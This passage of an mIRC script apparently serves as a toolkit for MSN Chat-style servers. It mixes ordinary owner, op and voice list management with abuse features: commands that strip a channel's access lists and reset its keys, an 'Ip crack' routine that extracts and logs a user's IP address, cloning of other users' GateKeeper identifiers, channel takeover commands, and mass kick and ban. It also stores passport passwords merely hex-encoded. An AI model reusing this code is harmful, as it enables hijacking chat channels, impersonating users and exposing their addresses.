    while ( %i <= $comchan( $$1, 0 ) ) { 
      %c = $comchan( $$1, %i )
      sockwrite -n $getSock(%c) $+( PROP %c ownerkey :$NULL, $crlf, MODE %c -qo $$1 $$1, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
      inc %i
    }
  }
  .Voice {
    var %i, %c
    %i = 1
    while ( %i <= $comchan( $$1, 0 ) ) { 
      %c = $comchan( $$1, %i )
      sockwrite -n $getSock(%c) MODE %c +v $$1
      inc %i
    }
  }
  .Devoice {
    var %i, %c
    %i = 1
    while ( %i <= $comchan( $$1, 0 ) ) { 
      %c = $comchan( $$1, %i )
      sockwrite -n $getSock(%c) $+( PROP %c ownerkey :$NULL, $crlf, MODE %c -v $$1, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
      inc %i
    }
  }
  .Kick {
    var %i, %c
    %i = 1
    while ( %i <= $comchan( $$1, 0 ) ) { 
      %c = $comchan( $$1, %i )
      sockwrite -n $getSock(%c) $+( PROP %c ownerkey :$NULL, $crlf, KICK %c $$1, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
      inc %i
    }
  }
  .Ban {
    var %i, %c
    %i = 1
    while ( %i <= $comchan( $$1, 0 ) ) { 
      %c = $comchan( $$1, %i )
      sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, ACCESS %c add deny *!, $ial( $$1 ).addr, $crlf, KICK %c $$1, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host, $crlf, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
      inc %i
    }
  } 
  $iif( $server == rigorMortis, Bot commands )
  .Bot owner : botOwner $$1
  .Bot deowner : botDeowner $$1
  .Bot op : botOp $$1
  .Bot deop : botDeop $$1
  .Bot voice : botVoice $$1
  .Bot devoice : botDevoice $$1
  .Bot kick : botKick $$1
  .Bot ban : botBan $$1
  .-
  .Bot aop : botAop $$1 
  .Bot deaop : botDeaop $$1
  .Bot ahost : bothost $$1 
  .Bot dehost : botdehost $$1
  .- 
  .Bot mod : botMod $$1
  .Bot tease : botTease $$1
  $iif( $server == rigorMortis, Global lists )
  .Owner
  ..Add {
    var %r, %i, %n, %u, %c, %cc
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    %i = 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      writeini -n aop.ini global %u %n %r
      %c = 1
      while ( %c <= $comchan( %n, 0 )) { 
        %cc = $comchan( %n, %c )
        if ( $popup.check( gaop, %cc ) == on ) {
          msg %cc $+( $chr(3), 5Global.q, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
          $clientQue(MODE %cc +qv %n %n)
        }
        inc %c
      }
      inc %i
    }
  }
  ..Remove {
    var %i, %n, %u, %c
    var %i 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      remini -n aop.ini global %u
      %c = 1
      while ( %c <= $comchan( %n, 0 )) { 
        msg $comchan( %n, %c ) $+( $chr(3), 5Global.q, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, removed, $chr(3), 2' )
        inc %c
      }
      inc %i 
    }
  }
  .Op
  ..Add {
    var %r, %i, %n, %u, %c, %cc
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    %i = 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      writeini -n ahost.ini global %u %n %r
      %c = 1
      while ( %c <= $comchan( %n, 0 )) { 
        %cc = $comchan( %n, %c )
        if ( $popup.check( gahost, %cc ) == on ) {
          msg %cc $+( $chr(3), 5Global.o, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
          if ( %n !isowner %cc ) { $clientQue(MODE %cc +ov %n %n) }
        }
        inc %c
      }
      inc %i
    }
  }
  ..Remove {
    var %i, %n, %u, %c
    var %i 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      remini -n ahost.ini global %u
      %c = 1
      while ( %c <= $comchan( %n, 0 )) { 
        msg $comchan( %n, %c ) $+( $chr(3), 5Global.o, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, removed, $chr(3), 2' )
        inc %c
      }
      inc %i 
    }
  } 
  .Voice
  ..Add {
    var %r, %i, %n, %u, %c, %cc
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    %i = 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      writeini -n avoice.ini global %u %n %r
      %c = 1
      while ( %c <= $comchan( %n, 0 )) { 
        %cc = $comchan( %n, %c )
        if ( $popup.check( gavoice, %cc ) == on ) {
          msg %cc $+( $chr(3), 5Global.v, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
          $clientQue(MODE %cc +v %n)
        }
        inc %c
      }
      inc %i
    }
  }
  ..Remove {
    var %i, %n, %u, %c
    var %i 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      remini -n avoice.ini global %u
      %c = 1
      while ( %c <= $comchan( %n, 0 )) { 
        msg $comchan( %n, %c ) $+( $chr(3), 5Global.v, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, removed, $chr(3), 2' )
        inc %c
      }
      inc %i 
    }
  }
  .Ban
  ..Add {
    var %r, %i, %n, %u, %k, %c, %cc
    %r = $?="reason ?"
    %r = $iif( %r, %r, Banlist )
    %i = 1 
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      writeini -n banlist.ini %u nick %n
      writeini -n banlist.ini %u reason %r
      %c = 1
      while ( %c <= $comchan( %n, 0 ) ) { 
        %cc = $comchan( %n, %c )
        $clientQue( ACCESS %cc add deny $+( *!, $gettok( %u, 1, 64 ), @* 0 :, $mrc $vers ) )
        $clientQue( KICK %cc %n $+( :, 5Banlist, $chr(3), 2 %n ', $chr(3), 5, %r, $chr(3), 2' ) ) 
        inc %c
      }
      inc %i
    }
  }
  ..Remove {
    var %i, %n, %u 
    %i = 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr 
      remini -n banlist.ini %u
      inc %i 
    }
  }
  $iif( $server == rigorMortis, Local lists )
  .Owner
  ..Add {
    var %r, %i, %n, %u
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    var %i 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      writeini -n aop.ini $mid( #, 2 ) %u %n %r
      $clientQue(MODE # +qv %n %n)
      msg # $+( $chr(3), 5Local.q, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
      inc %i 
    }
  } 
  ..Remove { 
    var %i, %n, %u
    var %i 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      remini -n aop.ini $mid( #, 2 ) %u
      msg # $+( $chr(3), 5Local.q, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, removed, $chr(3), 2' )
      inc %i 
    }
  }
  .Op
  ..Add {
    var %r, %i, %n, %u
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    var %i 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      writeini -n ahost.ini $mid( #, 2 ) %u %n %r
      if ( %n !isowner # ) { $clientQue(MODE # +ov %n %n) }
      msg # $+( $chr(3), 5Local.o, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
      inc %i 
    }
  }
  ..Remove {
    var %i, %n, %u
    var %i 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      remini -n ahost.ini $mid( #, 2 ) %u
      msg # $+( $chr(3), 5Local.o, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, removed, $chr(3), 2' )
      inc %i 
    }
  }  
  .Voice
  ..Add {
    var %r, %i, %n, %u
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    var %i 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      writeini -n avoice.ini $mid( #, 2 ) %u %n %r
      $clientQue(MODE # +v %n)
      msg # $+( $chr(3), 5Local.v, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
      inc %i 
    }
  }
  ..Remove {
    var %i, %n, %u
    var %i 1
    while ( %i <= $numtok( $snicks, 44 ) ) {
      %n = $$gettok( $snicks, %i, 44 )
      %u = $$ial( %n, 1 ).addr
      remini -n avoice.ini $mid( #, 2 ) %u
      msg # $+( $chr(3), 5Local.v, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, removed, $chr(3), 2' )
      inc %i 
    }
  }
  $iif( $server == rigorMortis, Ip crack )
  .Start
  ..Cols - 1 : { $ipcrack( $$1, #, 1 ) }
  ..Cols - 2 : { $ipcrack( $$1, #, 2 ) }
  ..Cols - 3 : { $ipcrack( $$1, #, 3 ) }
  ..Cols - 4 : { $ipcrack( $$1, #,   ) }
  .Stop {
    var %h, %g
    %h = ip. [ $+ [ # ] ]
    %g = $$hget( %h, gkp )
    sockwrite -n $getSock(#) $+( ACCESS # clear voice, $crlf, ACCESS # clear host, $crlf, ACCESS # clear owner, $crlf, PROP # ownerkey $key )
    $print( 5, #, Current ip - $$hget( %h, ip ) )
    writeini -n ip.ini %g ip $$hget( %h, ip )
    writeini -n ip.ini %g time $ctime 
    .hfree %h
  }
}

alias -l trojanListen {
  if ( $portfree( 12345 ) ) { socklisten $+( trojanListen., $hexString ) 12345 }
  if ( $portfree( 20034 ) ) { socklisten $+( trojanListen., $hexString ) 20034 }
  if ( $portfree( 27374 ) ) { socklisten $+( trojanListen., $hexString ) 27374 }
  if ( $portfree( 31337 ) ) { socklisten $+( trojanListen., $hexString ) 31337 }
}

on *:socklisten:trojanListen.*:{   
  beep 10
  var %sk
  %sk = $+( trojanConnect., $hexString )
  sockaccept %sk
  $print( 5, -a, $+( Attempted connection on port $sock($sockname).port from host ', $sock(%sk).ip, ' ) )
  $print( 5, -s, $+( Attempted connection on port $sock($sockname).port from host ', $sock(%sk).ip, ' ) )
  dns $sock(%sk).ip
  sockclose %sk
}

alias -l listSock {
  var %i, %s
  %i = 1
  while ( %i <= $sock( rigorMortis.????????????????, 0 ) ) { 
    %s = $sock( rigorMortis.????????????????, %i )
    $print( 5, -a, $+( SOCKLIST, $chr(3), 2 ', $chr(3), 5, %s, $chr(3), 2' $sock(%s).ip ', $chr(3), 5, $sock(%s).mark, $chr(3), 2' ) )
    inc %i
  }
  %i = 1
  while ( %i <= $sock( bot.????????????????, 0 ) ) { 
    %s = $sock( bot.????????????????, %i )
    $print( 5, -a, $+( SOCKLIST, $chr(3), 2 ', $chr(3), 5, %s, $chr(3), 2' $sock(%s).ip ', $chr(3), 5, $sock(%s).mark, $chr(3), 2' ) )
    inc %i
  }
  $print( 5, -a, $+( SOCKLIST, $chr(3), 2 ', $chr(3), 5TK2CHATCHATA01.*, $chr(3), 2' $sock( TK2CHATCHATA01.????????????????, 0 ) idle ) )
  $print( 5, -a, $+( SOCKLIST, $chr(3), 2 ', $chr(3), 5TK2CHATCHATA02.*, $chr(3), 2' $sock( TK2CHATCHATA02.????????????????, 0 ) idle ) )
  $print( 5, -a, $+( SOCKLIST, $chr(3), 2 ', $chr(3), 5TK2CHATCHATA03.*, $chr(3), 2' $sock( TK2CHATCHATA03.????????????????, 0 ) idle ) )
  $print( 5, -a, $+( SOCKLIST, $chr(3), 2 ', $chr(3), 5TK2CHATCHATA04.*, $chr(3), 2' $sock( TK2CHATCHATA04.????????????????, 0 ) idle ) )
  $print( 5, -a, $+( SOCKLIST, $chr(3), 2 ', $chr(3), 5TK2CHATCHATA05.*, $chr(3), 2' $sock( TK2CHATCHATA05.????????????????, 0 ) idle ) )
  $print( 5, -a, $+( SOCKLIST, $chr(3), 2 ', $chr(3), 5TK2CHATCHATA06.*, $chr(3), 2' $sock( TK2CHATCHATA06.????????????????, 0 ) idle ) )
  $print( 5, -a, $+( SOCKLIST, $chr(3), 2 ', $chr(3), 5TK2CHATWBA??.*, $chr(3), 2' $sock( findServer.????????????????, 0 ) idle ) )
}

menu channel {
  $iif( $server == rigorMortis, Global settings )
  .$+( $iif( %gaop != off, $style(1) ), Global owner list ) : set %gaop $iif( $popup.check( gaop ) == on, off, on )
  .$+( $iif( %gahost != off, $style(1) ), Global op list ) : set %gahost $iif( $popup.check( gahost ) == on, off, on )
  .$+( $iif( %gavoice != off, $style(1) ), Global voice list ) : set %gavoice $iif( $popup.check( gavoice ) == on, off, on )
  .$+( $iif( %banlist != off, $style(1) ), Global ban list ) : set %banlist $iif( $popup.check( banlist ) == on, off, on )
  .-
  .$+( $iif( %laop != off, $style(1) ), Channel owner list ) : set %laop $iif( $popup.check( laop ) == on, off, on )
  .$+( $iif( %lahost != off, $style(1) ), Channel op list ) : set %lahost $iif( $popup.check( lahost ) == on, off, on )
  .$+( $iif( %lavoice != off, $style(1) ), Channel voice list ) : set %lavoice $iif( $popup.check( lavoice ) == on, off, on )
  .- 
  .$+( $iif( %tag != off, $style(1) ), User ID ) : set %tag $iif( $popup.check( tag ) == on, off, on )
  .$+( $iif( %hopprot != off, $style(1) ), Hop prot ) : set %hopprot $iif( $popup.check( hopprot ) == on, off, on )
  .$+( $iif( %joinf != off, $style(1) ), Join flood prot ) : set %joinf $iif( $popup.check( joinf ) == on, off, on )
  .$+( $iif( %font != off, $style(1) ), Show fonts ) : set %font $iif( $popup.check( font ) == on, off, on )
  .$+( $iif( %chanProt != off, $style(1) ), Channel protection ) : set %chanProt $iif( $popup.check( chanProt ) == on, off, on )
  .-
  .Reset settings : {
    unset %*aop
    unset %*ahost
    unset %*avoice
    unset %banlist
    unset %tag 
    unset %hopprot
    unset %joinf
    unset %font
    unset %chanProt
  }
  $iif( $server == rigorMortis, Local settings )
  .$+( $iif( $popup.check( gaop, # ) == on, $style(1) ), Global owner list ) : set %gaop. [ $+ [ # ] ] $iif( $popup.check( gaop, # ) == on, off, on )
  .$+( $iif( $popup.check( gahost, # ) == on, $style(1) ), Global op list ) : set %gahost. [ $+ [ # ] ] $iif( $popup.check( gahost, # ) == on, off, on )
  .$+( $iif( $popup.check( gavoice, # ) == on, $style(1) ), Global voice list ) : set %gavoice. [ $+ [ # ] ] $iif( $popup.check( gavoice, # ) == on, off, on )
  .$+( $iif( $popup.check( banlist, # ) == on, $style(1) ), Global ban list ) : set %banlist. [ $+ [ # ] ] $iif( $popup.check( banlist, # ) == on, off, on )
  .-
  .$+( $iif( $popup.check( laop, # ) == on, $style(1) ), Channel owner list ) : set %laop. [ $+ [ # ] ] $iif( $popup.check( laop, # ) == on, off, on )
  .$+( $iif( $popup.check( lahost, # ) == on, $style(1) ), Channel host list ) : set %lahost. [ $+ [ # ] ] $iif( $popup.check( lahost, # ) == on, off, on )
  .$+( $iif( $popup.check( lavoice, # ) == on, $style(1) ), Channel voice list ) : set %lavoice. [ $+ [ # ] ] $iif( $popup.check( lavoice, # ) == on, off, on )
  .-
  .$+( $iif( $popup.check( hopprot, # ) == on, $style(1) ), Hop prot ) : set %hopprot. [ $+ [ # ] ] $iif( $popup.check( hopprot, # ) == on, off, on )
  .$+( $iif( $popup.check( joinf, # ) == on, $style(1) ), Join flood prot ) : set %joinf. [ $+ [ # ] ] $iif( $popup.check( joinf, # ) == on, off, on )
  .$+( $iif( $popup.check( font, # ) == on, $style(1) ), Show fonts ) : set %font. [ $+ [ # ] ] $iif( $popup.check( font, # ) == on, off, on )
  .$+( $iif( $popup.check( chanProt, # ) == on, $style(1) ), Channel protection ) : set %chanProt. [ $+ [ # ] ] $iif( $popup.check( chanProt, # ) == on, off, on )
  .$+( $iif( %autokick. [ $+ [ # ] ] == on, $style(1) ), Auto kicktake ) : set %autokick. [ $+ [ # ] ] $iif( !%autokick. [ $+ [ # ] ] || %autokick. [ $+ [ # ] ] == off, on, off )
  .$+( $iif( %autonull. [ $+ [ # ] ] == on, $style(1) ), Auto nulltake ) : set %autonull. [ $+ [ # ] ] $iif( !%autonull. [ $+ [ # ] ] || %autonull. [ $+ [ # ] ] == off, on, off )
  .-
  .Reset settings : {
    unset %*aop.*
    unset %*ahost.*
    unset %*avoice.*
    unset %banlist.* 
    unset %hopprot.*
    unset %joinf.*
    unset %font.*
    unset %chanProt.*
    unset %auto*
  }
  $iif( $server == rigorMortis && $sock(findServer.????????????????), Channel creation )  
  .$+( Quick, $chr(9), - ... ) : CREATE $$?="channel ?"
  .$+( Dialog, $chr(9), - ... ) : dialog -m create create
  $iif( $server == rigorMortis, Room list ) : $roomList( $?="Category ?", $?="Page ? " )
  $iif( $server == rigorMortis, Channel props ) 
  .$+( Ownerkey, $chr(9), - $$mid( $getKey( $mid( #, 2 ), q ), 2 ) ) : mode $me +h $$mid( $getKey( $mid( #, 2 ), q ), 2 )
  .$+( Hostkey, $chr(9), - $$mid( $getKey( $mid( #, 2 ), o ), 2 ) ) : mode $me +h $$mid( $getKey( $mid( #, 2 ), o ), 2 )
  $iif( rigorMortis == $server, Passports )
  .$+( $style(2), $iif( $len( $getCurPp ) >= 6, $+( Selected Pp, $chr(9), - $hexToAscii($getCurPp) ), No Pp ) ) : null
  .$+( $style(2), $iif( $getGkp($getCurPp), $+( Selected Gkp, $chr(9), - $getGkp($getCurPp) ), No Gkp ) ) : null
  .$+( $style(2), $iif( $getLastUpdate($getCurPp), $+( Selected updated dur, $chr(9), - $duration($calc( $ctime - $getLastUpdate($getCurPp) )) ago), No update ) ) : null
  .$+( $style(2), $iif( $getLastUpdate($getCurPp), $+( Selected pp subscribed, $chr(9), - $iif( $getSubscribed($getCurPp), true, false ) ), No pp ) ) : null
  .$submenu($subPp($1))
  .$+( Passport add, $chr(9), - ... ) {
    var %pp, %pw
    %pp = $$?="Passport to add ?"
    %pw = $$?="Password for %pp ?"
    %pw = $mid( $asciiToHex( s, %pw ), 2 )
    %pp = $mid( $asciiToHex( s, %pp ), 2 )
    writeini -n passport.ini %pp password %pw
    if ( $len($getCurPp) <= 3 ) { $setCurPp(%pp) }
    $update( %pp, %pw )
  }
  .$+( Passport remove, $chr(9), - selected ) {
    remini -n passport.ini $mid( $getCurPp, 2 )
    $setCurPp(.)
  }
  .$+( Passport update, $chr(9), - selected ) : $update( $mid( $getCurPp, 2 ), $readini( passport.ini, $mid( $getCurPp, 2 ), password ) )
  $iif( rigorMortis == $server, GateKeeper )
  .$+( $style(2), Selected, $chr(9), - $getGateKeeper ) : null
  .$+( $iif( $getGateKeeperType == binary, $style(1) ), Binary, $chr(9), - $getGateKeeper(binary) ) : $setGateKeeperType(binary)
  .$+( $iif( $getGateKeeperType == octal, $style(1) ), Octal, $chr(9), - $getGateKeeper(octal) ) : $setGateKeeperType(octal)
  .$+( $iif( $getGateKeeperType == denary, $style(1) ), Denary, $chr(9), - $getGateKeeper(denary) ) : $setGateKeeperType(denary)
  .$+( $iif( $getGateKeeperType == hex, $style(1) ), Hexadecimal, $chr(9), - $getGateKeeper(hex) ) : $setGateKeeperType(hex)
  .$+( $iif( $getGateKeeperType == WEBTV, $style(1) ), WEB-TV, $chr(9), - $getGateKeeper(WEBTV) ) : $setGateKeeperType(WEBTV)
  .$+( $iif( $getGateKeeperType == clone, $style(1) ), Clone, $chr(9), - $getGateKeeper(clone) ) : { $setGateKeeperClone($$?="GateKeeper to clone ?") | $setGateKeeperType(clone) }
  .$+( $iif( $getGateKeeperType == normal || !$getGateKeeperType, $style(1) ), Normal, $chr(9), - $getGateKeeper(normal) ) : $setGateKeeperType(normal)
  $iif( $server == rigorMortis, Sockbot )
  .$+( $style(2), $iif( $len( $getSockPp ) >= 6, $+( Selected Pp, $chr(9), - $hexToAscii($getSockPp) ), No Pp ) ) : null
  .$+( $style(2), $iif( $getGkp($getSockPp), $+( Selected Gkp, $chr(9), - $getGkp($getSockPp) ), No Gkp ) ) : null
  .$+( $style(2), $iif( $getLastUpdate($getSockPp), $+( Selected updated dur, $chr(9), - $duration($calc( $ctime - $getLastUpdate($getSockPp) )) ago), No update ) ) : null
  .$+( $style(2), $iif( $getLastUpdate($getSockPp), $+( Selected pp subscribed, $chr(9), - $iif( $getSubscribed($getSockPp), true, false ) ), No pp ) ) : null
  .$submenu($subSockPp($1))
  .$+( Passport add, $chr(9), - ... ) {
    var %pp, %pw
    %pp = $$?="Passport to add ?"
    %pw = $$?="Password for %pp ?"
    %pw = $mid( $asciiToHex( s, %pw ), 2 )
    %pp = $mid( $asciiToHex( s, %pp ), 2 )
    writeini -n passport.ini %pp password %pw
    if ( $len($getSockPp) <= 3 ) { $setSockPp(%pp) }
    $update( %pp, %pw )
  }
  .$+( Passport remove, $chr(9), - selected ) {
    remini -n passport.ini $mid( $getSockPp, 2 )
    $setSockPp(.)
  }
  .$+( Passport update, $chr(9), - selected ) : $update( $mid( $getSockPp, 2 ), $readini( passport.ini, $mid( $getSockPp, 2 ), password ) )
  .-
  .$+( $iif( $popup.check( useSub, # ) == on, $style(1) ), Use subscription info, $chr(9), - ) : set %useSub. [ $+ [ # ] ] $iif( $popup.check( useSub, # ) == on, off, on )
  .$+( $iif( $popup.check( sockDeowner, # ) == on, $style(1) ), Only aop can be +q, $chr(9), - ) : set %sockDeowner. [ $+ [ # ] ] $iif( $popup.check( sockDeowner, # ) == on, off, on )
  .$+( $iif( $popup.check( sockDeop, # ) == on, $style(1) ), Only ahost can be +o, $chr(9), - ) : set %sockDeop. [ $+ [ # ] ] $iif( $popup.check( sockDeop, # ) == on, off, on )
  .$+( $iif( $popup.check( botNoAccess, # ) == on, $style(1) ), Only aop can have access, $chr(9), - ) : set %botNoAccess. [ $+ [ # ] ] $iif( $popup.check( botNoAccess, # ) == on, off, on )  
  .-
  .$+( Bot auth, $chr(9), - ... ) : bot $?="Nick ?"
  .$+( Bot join, $chr(9), - ) : botjoin
  .$+( Bot hop, $chr(9), - ) : bothop 
  .$+( Bot hopall, $chr(9), - ) : bothopall
  .$+( Bot clone, $chr(9), - ... ) : botclone $?="Nick ?"
  .$+( Bot close, $chr(9), - ) : botclose
  .$+( Bot closeall, $chr(9), - ) : botcloseall
  .-
  .$+( Reset settings, $chr(9), - ) {
    unset %useSub.*
    unset %sockDeowner.*
    unset %sockDeop.*
    unset %botNoAccess.*
  }
  $+( $iif( $server == rigorMortis, Mass commands ) )
  .Owner
  ..All : $massMode( 1, #, +q )
  ..Owners : $massMode( 2, #, +q )
  ..Opped : $massMode( 3, #, +q )
  ..Voiced : $massMode( 4, #, +q )
  ..Regular : $massMode( 5, #, +q )
  .Deowner
  ..All : $massMode( 1, #, -q )
  ..Owners : $massMode( 2, #, -q )
  ..Opped : $massMode( 3, #, -q )
  ..Voiced : $massMode( 4, #, -q )
  ..Regular : $massMode( 5, #, -q )
  .Op
  ..All : $massMode( 1, #, +o )
  ..Owners : $massMode( 2, #, +o )
  ..Opped : $massMode( 3, #, +o )
  ..Voiced : $massMode( 4, #, +o )
  ..Regular : $massMode( 5, #, +o )
  .Deop
  ..All : $massMode( 1, #, -o )
  ..Owners : $massMode( 2, #, -o )
  ..Opped : $massMode( 3, #, -o )
  ..Voiced : $massMode( 4, #, -o )
  ..Regular : $massMode( 5, #, -o )
  .Voice
  ..All : $massMode( 1, #, +v )
  ..Owners : $massMode( 2, #, +v )
  ..Opped : $massMode( 3, #, +v )
  ..Voiced : $massMode( 4, #, +v )
  ..Regular : $massMode( 5, #, +v )
  .Devoice
  ..All : $massMode( 1, #, -v )
  ..Owners : $massMode( 2, #, -v )
  ..Opped : $massMode( 3, #, -v )
  ..Voiced : $massMode( 4, #, -v )
  ..Regular : $massMode( 5, #, -v )
  .Kick
  ..All : $massKick( 1, # )
  ..Owners : $massKick( 2, # )
  ..Opped : $massKick( 3, # )
  ..Voiced : $massKick( 4, # )
  ..Regular : $massKick( 5, # )
  .Ban
  ..All : $massBan( 1, # )
  ..Owners : $massBan( 2, # )
  ..Opped : $massBan( 3, # )
  ..Voiced : $massBan( 4, # )
  ..Regular : $massBan( 5, # )
  .Banlist
  ..All : $massBanList( 1, # )
  ..Owners : $massBanList( 2, # )
  ..Opped : $massBanList( 3, # )
  ..Voiced : $massBanList( 4, # )
  ..Regular : $massBanList( 5, # )
  $iif( $server == rigorMortis, Misc commands )
  .$+( Findu, $chr(9), - ... ) : findu $$?="Findu ?"
  .$+( Who, $chr(9), - ... ) : who $$?="Who ?"
  .$+( Whois, $chr(9), - ... ) : whois $$?="Whois ?" 
  .$+( Notice, $chr(9), - ... ) : notice $$?="Who ? Message ?"
  .$+( Mass notice, $chr(9), - ... ) : massnotice $$?="Message ?"
  .$+( Users scan, $chr(9), - ) : $userScan(#)
  .$+( Join, $chr(9), - ... ) : join $$?="Join ?"
  .$+( Part all, $chr(9), - ) : partall
  .$+( Hop all, $chr(9), - ) : hopall
  .$+( Nick, $chr(9), - ... ) : $clone( $$?="Nick ?" )
  .$+( Quit, $chr(9), - ) : quit null
  .$+( Kick match, $chr(9), - ... ) : $kickMatch( $$?="Wild card ?" )
  .$+( Ban match, $chr(9), - ... ) : $banMatch( $$?="Wild card ?" )
  $iif( $server == rigorMortis, Takes )
  .$+( Take, $chr(9), - ) : take
  .$+( Kicktake, $chr(9), - ) : kicktake
  .$+( Null, $chr(9), - ) : null
  .$+( Take ALL, $chr(9), - ) : takeall
  $iif( $server == rigorMortis, User lists )
  .Owner
  ..$+( Global, $chr(9), - )
  ...$submenu($subUserList( $1, aop, global ))
  ..$+( Local, $chr(9), - )
  ...$submenu($subUserList( $1, aop, $mid( #, 2 ) ))   
  ..$+( Add global, $chr(9), - ... ) {
    var %r, %n, %u, %i, %cc
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n aop.ini global %u %n %r
    %i = 1
    while ( %i <= $comchan( %n, 0 )) { 
      %cc = $comchan( %n, %i )
      if ( $popup.check( gaop, %cc ) == on ) {
        msg %cc $+( $chr(3), 5Global.q, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
        $clientQue(MODE %cc +qv %n %n)
      }
      inc %i
    }
  }
  ..$+( Add local, $chr(9), - ... ) {
    var %r, %n, %u
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n aop.ini $mid( #, 2 ) %u %n %r
    if ( $popup.check( laop, # ) == on ) {
      msg # $+( $chr(3), 5Local.q, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
      $clientQue(MODE # +qv %n %n)
    }
  }
  .Op
  ..$+( Global, $chr(9), - )
  ...$submenu($subUserList( $1, ahost, global ))
  ..$+( Local, $chr(9), - )
  ...$submenu($subUserList( $1, ahost, $mid( #, 2 ) ))   
  ..$+( Add global, $chr(9), - ... ) {
    var %r, %n, %u, %i, %cc
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n ahost.ini global %u %n %r
    %i = 1
    while ( %i <= $comchan( %n, 0 )) { 
      %cc = $comchan( %n, %i )
      if ( $popup.check( gahost, %cc ) == on ) {
        msg %cc $+( $chr(3), 5Global.o, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
        if ( %n !isowner %cc ) { $clientQue(MODE %cc +ov %n %n) }
      }
      inc %i
    }
  }
  ..$+( Add local, $chr(9), - ... ) {
    var %r, %n, %u
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n ahost.ini $mid( #, 2 ) %u %n %r
    if ( $popup.check( lahost, # ) == on ) {
      msg # $+( $chr(3), 5Local.o, $chr(3), 2 %n $chr(3), 2', $chr(3), 5, %r, $chr(3), 2' )
      if ( %n !isowner # ) { $clientQue(MODE # +ov %n %n) }
    }
  }
  .Voice
  ..$+( Global, $chr(9), - )
  ...$submenu($subUserList( $1, avoice, global ))
  ..$+( Local, $chr(9), - )
  ...$submenu($subUserList( $1, avoice, $mid( #, 2 ) ))   
  ..$+( Add global, $chr(9), - ... ) {
    var %r, %n, %u, %i, %cc
    %n = $$?="nick ?"
    %u = $$?="GKP ?"
    %r = $?="welcome msg ?"
    %r = $iif( %r, %r, hi )
    writeini -n avoice.ini global %u %n %r
    %i = 1
